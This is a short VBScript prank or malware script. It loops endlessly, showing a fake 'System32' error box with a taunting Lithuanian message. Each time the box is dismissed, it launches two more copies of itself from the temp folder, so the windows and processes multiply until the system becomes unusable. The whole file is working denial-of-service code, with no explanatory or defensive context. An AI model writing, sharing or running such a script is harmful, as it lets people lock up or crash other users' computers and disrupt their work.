Set shell = CreateObject("WScript.Shell")
Do
    X = MsgBox("Meškos paslauga, kiddo", 0 + 16, "System32")
    If X = 1 Then
        shell.Run """%TEMP%\Unclosable.vbs"""
	shell.Run """%TEMP%\Unclosable.vbs"""
    End If
Loop
